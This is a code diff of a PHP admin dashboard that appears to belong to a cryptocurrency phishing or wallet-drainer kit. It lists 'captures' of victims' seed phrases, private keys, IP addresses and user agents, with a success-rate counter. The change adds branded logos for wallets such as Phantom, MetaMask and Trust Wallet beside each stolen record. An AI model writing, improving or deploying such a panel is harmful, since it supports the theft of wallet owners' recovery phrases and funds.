@@ -84,7 +84,6 @@ if ($isAuthed) {
         }
         .container { max-width: 1500px; margin: 0 auto; padding: 20px 24px; }
 
-        /* HEADER */
         .header {
             display: flex; justify-content: space-between; align-items: center;
             padding: 16px 0; border-bottom: 1px solid rgba(0,122,255,0.08);
@@ -109,7 +108,6 @@ if ($isAuthed) {
         .btn-green { background: rgba(76,175,80,0.08); color: #4caf50; border: 1px solid rgba(76,175,80,0.12); }
         .btn-green:hover { background: rgba(76,175,80,0.15); }
 
-        /* LOGIN */
         .login-wrap {
             min-height: 80vh; display: flex; align-items: center; justify-content: center;
         }
@@ -136,7 +134,6 @@ if ($isAuthed) {
         .login-box button:hover { box-shadow: 0 6px 20px rgba(0,122,255,0.25); }
         .login-error { color: #ff4757; font-size: 13px; margin-top: 12px; }
 
-        /* MESSAGES */
         .msg-bar { margin-bottom: 20px; }
         .msg {
             padding: 10px 16px; border-radius: 8px; font-size: 13px;
@@ -146,7 +143,6 @@ if ($isAuthed) {
         .msg.error { background: rgba(255,71,87,0.06); border: 1px solid rgba(255,71,87,0.1); color: #ff4757; }
         .msg.info { background: rgba(0,122,255,0.05); border: 1px solid rgba(0,122,255,0.08); color: #4da6ff; }
 
-        /* STATS */
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
@@ -162,13 +158,12 @@ if ($isAuthed) {
         .stat-card .num.blue { color: #4da6ff; }
         .stat-card .lbl { font-size: 11px; color: #556677; margin-top: 4px; text-transform: uppercase; letter-spacing: 0.4px; }
 
-        /* TABLE */
         .table-wrap {
             background: #0d1225; border: 1px solid rgba(255,255,255,0.03);
             border-radius: 12px; overflow: hidden;
         }
         .table-scroll { overflow-x: auto; }
-        table { width: 100%; border-collapse: collapse; min-width: 820px; }
+        table { width: 100%; border-collapse: collapse; min-width: 850px; }
         th {
             padding: 12px 14px; text-align: left; font-size: 10px;
             color: #556677; text-transform: uppercase; letter-spacing: 0.5px;
@@ -182,13 +177,22 @@ if ($isAuthed) {
         tr:last-child td { border-bottom: none; }
         tr:hover td { background: rgba(0,122,255,0.02); }
         .wallet-badge {
-            display: inline-block;
-            padding: 2px 10px;
-            border-radius: 4px;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 3px 10px 3px 6px;
+            border-radius: 6px;
             font-size: 11px;
             font-weight: 600;
-            background: rgba(0,122,255,0.08);
+            background: rgba(0,122,255,0.06);
             color: #4da6ff;
+            white-space: nowrap;
+        }
+        .wallet-badge img {
+            width: 16px;
+            height: 16px;
+            border-radius: 3px;
+            object-fit: contain;
         }
         .cell-id { font-family: monospace; font-size: 10px; color: #445566; }
         .cell-ip { font-family: monospace; font-size: 11px; color: #667788; }
@@ -209,7 +213,6 @@ if ($isAuthed) {
         .no-data .icon { font-size: 42px; margin-bottom: 12px; opacity: 0.4; }
         .no-data p { font-size: 14px; }
 
-        /* SUMMARY */
         .summary-box {
             margin-top: 20px; background: #0d1225;
             border: 1px solid rgba(255,255,255,0.03); border-radius: 12px;
@@ -226,7 +229,6 @@ if ($isAuthed) {
             font-family: 'SF Mono', 'Courier New', monospace; line-height: 1.5;
         }
 
-        /* RESPONSIVE */
         @media (max-width: 768px) {
             .container { padding: 14px 16px; }
             .header { flex-direction: column; align-items: stretch; }
@@ -239,6 +241,8 @@ if ($isAuthed) {
             .cell-seed { max-width: 100px; }
             .cell-key { max-width: 70px; }
             .cell-ua { max-width: 60px; }
+            .wallet-badge { font-size: 10px; padding: 2px 8px 2px 4px; }
+            .wallet-badge img { width: 14px; height: 14px; }
             .summary-box { padding: 14px; }
             .summary-box pre { font-size: 10px; }
         }
@@ -267,7 +271,6 @@ if ($isAuthed) {
             </div>
         </div>
     <?php else: ?>
-        <!-- HEADER -->
         <div class="header">
             <div class="header-left">
                 <img src="images/logo.png" alt="">
@@ -301,9 +304,20 @@ if ($isAuthed) {
             }
         }
         $total = count($captures); $uniqueIps = array_unique($ips);
+
+        // Wallet logo map for admin display
+        $walletLogoMap = [
+            'phantom'    => 'https://mintcdn.com/phantom-e50e2e68/tU9g5MXFXgx4l6Em/resources/images/Phantom_SVG_Icon.svg?fit=max&auto=format&n=tU9g5MXFXgx4l6Em&q=85&s=7170eec10d9199f7766d6e4ccd1e56ff',
+            'metamask'   => 'https://images.ctfassets.net/clixtyxoaeas/1ezuBGezqfIeifWdVtwU4c/d970d4cdf13b163efddddd5709164d2e/MetaMask-icon-Fox.svg',
+            'trustwallet'=> 'https://logo.svgcdn.com/token-branded/trust-wallet.svg',
+            'solflare'   => 'https://logo.svgcdn.com/token-branded/solflare.svg',
+            'coinbase'   => 'https://static-assets.coinbase.com/ui-infra/illustration/v1/pictogram/svg/light/coinbaseLogoNavigation-2.svg',
+            'backpack'   => 'https://logo.svgcdn.com/token-branded/backpack.svg',
+            'okx'        => 'https://upload.wikimedia.org/wikipedia/commons/c/c2/OKX_logo.svg',
+            'rabby'      => 'https://raw.githubusercontent.com/RabbyHub/logo/main/rabby.svg',
+        ];
         ?>
 
-        <!-- STATS -->
         <div class="stats-grid">
             <div class="stat-card"><div class="num blue"><?php echo $total; ?></div><div class="lbl">Captures</div></div>
             <div class="stat-card"><div class="num green"><?php echo $totalSeeds; ?></div><div class="lbl">Seeds</div></div>
@@ -312,7 +326,6 @@ if ($isAuthed) {
             <div class="stat-card"><div class="num"><?php echo $total > 0 ? round(($totalSeeds/$total)*100).'%' : '0%'; ?></div><div class="lbl">Success</div></div>
         </div>
 
-        <!-- TABLE -->
         <div class="table-wrap">
             <?php if (empty($captures)): ?>
                 <div class="no-data">
@@ -339,11 +352,22 @@ if ($isAuthed) {
                         </thead>
                         <tbody>
                         <?php foreach (array_reverse($captures) as $idx => $c): $realIdx = count($captures) - 1 - $idx; ?>
+                            <?php
+                                $w = strtolower($c['wallet'] ?? '');
+                                $wName = $c['walletName'] ?? ucfirst($w);
+                                $wLogo = $walletLogoMap[$w] ?? 'images/logo.png';
+                                $wLabel = !empty($wName) ? $wName : (ucfirst($w) ?: '?');
+                            ?>
                             <tr>
                                 <td><?php echo $idx + 1; ?></td>
-                                <td><span class="wallet-badge"><?php echo htmlspecialchars(ucfirst($c['wallet']??'?')); ?></span></td>
+                                <td>
+                                    <span class="wallet-badge">
+                                        <img src="<?php echo $wLogo; ?>" alt="" onerror="this.style.display='none'">
+                                        <?php echo htmlspecialchars($wLabel); ?>
+                                    </span>
+                                </td>
                                 <td class="cell-id"><?php echo htmlspecialchars(substr($c['id']??'', 0, 10)); ?></td>
-                                <td class="cell-time"><?php echo htmlspecialchars($c['capturedAt']??'—'); ?></td>
+                                <td class="cell-time"><?php echo htmlspecialchars($c['timestamp']??$c['capturedAt']??'—'); ?></td>
                                 <td class="cell-ip"><?php echo htmlspecialchars($c['ip']??'—'); ?></td>
                                 <td class="<?php echo !empty($c['seed'])?'cell-seed':'cell-none'; ?>"><?php echo !empty($c['seed'])?htmlspecialchars($c['seed']):'—'; ?></td>
                                 <td class="<?php echo !empty($c['pkey'])?'cell-key':'cell-none'; ?>"><?php echo !empty($c['pkey'])?htmlspecialchars($c['pkey']):'—'; ?></td>
@@ -359,7 +383,6 @@ if ($isAuthed) {
             <?php endif; ?>
         </div>
 
-        <!-- SUMMARY -->
         <?php if (file_exists($summaryFile) && filesize($summaryFile) > 0): ?>
             <div class="summary-box">
                 <h3>Activity Log</h3>
